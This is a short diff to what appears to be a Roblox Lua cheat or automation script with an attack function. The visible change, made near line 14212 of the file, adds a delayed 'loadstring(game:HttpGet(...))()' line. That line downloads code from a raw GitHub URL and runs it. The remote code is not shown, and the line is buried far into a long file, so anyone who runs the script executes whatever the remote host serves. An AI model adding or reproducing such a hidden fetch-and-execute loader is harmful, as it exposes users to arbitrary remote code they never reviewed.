@@ -1,7 +1,6 @@
 
 
 
-
 function Attack1Function()
 	local ac = CombatFrameworkR.activeController
 	if ac and ac.equipped then
@@ -14212,7 +14211,8 @@ end)
 
 
 
-
+wait(3)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/Master/main/checkfm'))()
 
 
 
